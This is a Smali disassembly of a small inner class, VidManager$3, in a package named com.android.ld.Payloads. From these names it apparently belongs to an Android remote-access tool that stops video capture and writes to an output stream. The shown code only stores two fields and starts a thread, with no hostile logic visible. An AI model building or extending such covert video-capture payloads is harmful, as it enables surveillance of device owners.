.class Lcom/android/ld/Payloads/VidManager$3;
.super Ljava/lang/Object;
.source "VidManager.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/ld/Payloads/VidManager;->videoStop(Ljava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/ld/Payloads/VidManager;

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/android/ld/Payloads/VidManager;Ljava/io/OutputStream;)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/ld/Payloads/VidManager;

    .line 181
    iput-object p1, p0, Lcom/android/ld/Payloads/VidManager$3;->this$0:Lcom/android/ld/Payloads/VidManager;

    iput-object p2, p0, Lcom/android/ld/Payloads/VidManager$3;->val$outputStream:Ljava/io/OutputStream;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .line 184
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/android/ld/Payloads/VidManager$3$1;

    invoke-direct {v1, p0}, Lcom/android/ld/Payloads/VidManager$3$1;-><init>(Lcom/android/ld/Payloads/VidManager$3;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 194
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 195
    return-void
.end method
